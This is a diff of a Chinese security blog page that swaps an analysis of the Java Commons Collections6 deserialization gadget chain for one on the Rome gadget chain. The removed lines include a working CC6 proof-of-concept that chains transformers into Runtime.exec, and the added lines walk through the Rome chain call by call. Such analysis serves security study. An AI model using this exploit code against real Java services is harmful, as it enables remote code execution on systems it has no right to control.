@@ -3,15 +3,14 @@
 
 	<head>
 		
-<title>Java反序列化-Commons Collections6利用链分析-信息安全博客</title>
+<title>Java反序列化-Rome利用链分析-信息安全博客</title>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
 <link rel="shortcut icon" type="image/x-icon" href="/image/favicon1.ico">
 
-
-<meta name="keywords" content="java安全,cc链,">
-<meta name="description" content="">
+<meta name="keywords" content="信息安全,网络安全,blog,TRRQ">
+<meta name="description" content="致力于网络安全技术研究">
 
 
 <script src="/js/jquery.min.js"></script>
@@ -244,14 +243,8 @@
     <div class="bg-content">
         <ul class="tag">
             
-            
-            <li><a href="/tags/java安全">java安全</a></li>
-            
-            <li><a href="/tags/cc链">cc链</a></li>
-            
-            
         </ul>
-        <h1>Java反序列化-Commons Collections6利用链分析</h1>
+        <h1>Java反序列化-Rome利用链分析</h1>
         <div class="article-info">
             <div class="article-author">
                 
@@ -263,46 +256,42 @@
                 </svg>
                 
                 <span> <a href="">TRRQ</a></span>
-                <p>2022-03-05 21:45:51</p>
+                <p>2022-03-10 19:13:01</p>
             </div>
         </div>
     </div>
 </div>
 <div class="article-content">
     <div id="article" class="content">
-        <h1 id="Java反序列化-Commons-Collections6利用链分析"><a href="#Java反序列化-Commons-Collections6利用链分析" class="headerlink" title="Java反序列化-Commons Collections6利用链分析"></a>Java反序列化-Commons Collections6利用链分析</h1><h2 id="Gadget-Chain"><a href="#Gadget-Chain" class="headerlink" title="Gadget Chain"></a>Gadget Chain</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">java.io.ObjectInputStream.readObject()<br>            java.util.HashSet.readObject()<br>                java.util.HashMap.put()<br>                java.util.HashMap.hash()<br>                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()<br>                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()<br>                        org.apache.commons.collections.map.LazyMap.get()<br>                            org.apache.commons.collections.functors.ChainedTransformer.transform()<br>                            org.apache.commons.collections.functors.InvokerTransformer.transform()<br>                            java.lang.reflect.Method.invoke()<br>                                java.lang.Runtime.exec()<br></code></pre></td></tr></table></figure>
-
-<p>与Commons Collections1链相比，从调用到LazyMap.get()，可以看出后半部分是一样的，主要是前半部分做了修改，与URLDNS那条链类似</p>
+        <h1 id="Java反序列化-Rome利用链分析"><a href="#Java反序列化-Rome利用链分析" class="headerlink" title="Java反序列化-Rome利用链分析"></a>Java反序列化-Rome利用链分析</h1><h2 id="调试配置"><a href="#调试配置" class="headerlink" title="调试配置"></a>调试配置</h2><p>关闭Enable，使用idea调试时，会默认调用实例的toString方法，并忽略toString使用的方法中的断点</p>
+<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220310191649.png"></p>
 </br>
 
-<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.test;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test6</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException </span>&#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>            <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-keyword">null</span>&#125;),<br>            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>&#125;),<br>            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> HashMap();<br><span class="hljs-comment">//        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map,chainedTransformer);</span><br>        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map,<span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>));<br><br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(lazyMap, <span class="hljs-string">&quot;aaa&quot;</span>);<br><br>        HashMap&lt;Object, Object&gt; map2 = <span class="hljs-keyword">new</span> HashMap();<br>        map2.put(tiedMapEntry, <span class="hljs-string">&quot;bbb&quot;</span>);<br>        lazyMap.remove(<span class="hljs-string">&quot;aaa&quot;</span>);<br><br>        Class c = LazyMap.class;<br>        Field factoryField = c.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        factoryField.setAccessible(<span class="hljs-keyword">true</span>);<br>        factoryField.set(lazyMap,chainedTransformer);<br><br>        serialize(map2);<br>        unserialize();<br>    &#125;<br>    <span class="hljs-comment">//序列化和反序列化</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">serialize</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        <span class="hljs-comment">// ObjectOutputStream 对象输出流，将Person对象存储到E盘的Person.txt文件中，完成对Person对象的序列化操作</span><br>        ObjectOutputStream oo = <span class="hljs-keyword">new</span> ObjectOutputStream(<span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-keyword">new</span> File(<span class="hljs-string">&quot;ser.bin&quot;</span>)));<br>        oo.writeObject(o);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title">unserialize</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>&#123;<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> FileInputStream(<br>            <span class="hljs-keyword">new</span> File(<span class="hljs-string">&quot;ser.bin&quot;</span>)));<br>        Object object = (Object) ois.readObject();<br>        System.out.println(<span class="hljs-string">&quot;反序列化成功！&quot;</span>);<br>        <span class="hljs-keyword">return</span> object;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
-
-</br>
-
-<h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>我们直接从LazyMap.get开始走，看看谁调用了get方法，原作者是找到了这个TideMapEntry的getValue方法，传入的是一个key，map则是LazyMap</p>
-<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220306083438.png"></p>
-<p>这里的map和key，是通过构造方法传入的，所以我们这里要传入一个map和一个key</p>
-<img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220306084238.png" style="zoom: 50%;" />
+<h2 id="Gadget-Chain"><a href="#Gadget-Chain" class="headerlink" title="Gadget Chain"></a>Gadget Chain</h2><figure class="highlight reasonml"><table><tr><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>get<span class="hljs-constructor">OutputProperties()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">NativeMethodAccessorImpl</span>.</span></span>invoke0(Method, Object, Object<span class="hljs-literal">[]</span>)<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">NativeMethodAccessorImpl</span>.</span></span>invoke(Object, Object<span class="hljs-literal">[]</span>)<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DelegatingMethodAccessorImpl</span>.</span></span>invoke(Object, Object<span class="hljs-literal">[]</span>)<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke(Object, Object...)<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ToStringBean</span>.</span></span><span class="hljs-keyword">to</span><span class="hljs-constructor">String(String)</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ToStringBean</span>.</span></span><span class="hljs-keyword">to</span><span class="hljs-constructor">String()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectBean</span>.</span></span><span class="hljs-keyword">to</span><span class="hljs-constructor">String()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">EqualsBean</span>.</span></span>bean<span class="hljs-constructor">HashCode()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectBean</span>.</span></span>hash<span class="hljs-constructor">Code()</span><br>HashMap&lt;K,V&gt;.hash(Object)<br>HashMap&lt;K,V&gt;.read<span class="hljs-constructor">Object(ObjectInputStream)</span><br></code></pre></td></tr></table></figure>
 
 </br>
 
-<p>TiedMapEntry下方有个hashCode调用到了getValue()</p>
-<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220306083529.png"></p>
-<p>之后找到HashMap的hash调用的key.hashCode()，这里的key是需要传入TiedMap</p>
-<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220306082515.png"></p>
-<p>最后readObject调用到了hash完成了这条链，这里key要传入TiedMapEntry这样后面才能走到这个类上</p>
-<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220306082435.png"></p>
+<h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>首先是从HashMap的hash，传入一个key</p>
+<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220310192402.png"></p>
+<p>走到hash，发现调用了key.hashCode()，我们要调用ObjectBean.hashCode，所以key就要new一个ObjectBean</p>
+<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220310192510.png"></p>
+<p>两参构造传入了三参构造，并且传入了beanClass和obj</p>
+<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220310192918.png"></p>
+<p>EqualsBean将参数传入到this</p>
+<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220310193043.png"></p>
+<p>_obj是我们之前传入的，所以说我们new ObjectBean的时候第一个参数要传入ObjectBean，走入ObjectBean.toString()</p>
+<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220310193337.png"></p>
+<p>调用到了_toStringBean.toString</p>
+<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220310193640.png"></p>
+<p>依然是由构造方法传入</p>
+<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220310193734.png"></p>
+<p>调用到了ToStringBean.toString()</p>
+<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220310194024.png"></p>
+<p>又调用到了下面这个toString上，最后是走到invoke上</p>
+<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220310194304.png"></p>
 </br>
 
-<p>最后为什么我们要修改掉LazyMap.decorate的参数呢？</p>
-<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220306085838.png"></p>
-<p>这是因为put方法也会执行hash方法</p>
-<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220306085935.png"></p>
-<p>所以最后我们只好通过反射先让条件不触发，随便传一个Transformer，等put结束后，再把值改</p>
-<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220310165551.png"></p>
-<p>这是因为在序列化的时候走到get方法，判断为false就会走进了map.put上，将map的键值给修改了，在反序列化的时候就会影响到后面，正常情况我们是调用到transform就走上我们的链了,所以这里多出key，我们就可以将put的key删除即可</p>
-<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220306102307.png"></p>
-
+<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2>
     </div>
 </div>
 <style>
@@ -331,19 +320,12 @@
 </script>
 <div class="Last-Next">
     
-    <a href="/2022/03/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Commons-Collections3%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/">
-        <div class="last">
-            <span>上一篇</span>
-            <p>Java反序列化-Commons Collections3利用链分析</p>
-        </div>
-    </a>
-    
 
     
-    <a href="/2022/03/02/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Commons%20Collections1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/">
+    <a href="/2022/03/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Commons-Collections3%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/">
         <div class="next">
             <span>下一篇</span>
-            <p>Java反序列化-Commons Collections1利用链分析</p>
+            <p>Java反序列化-Commons Collections3利用链分析</p>
         </div>
     </a>
     
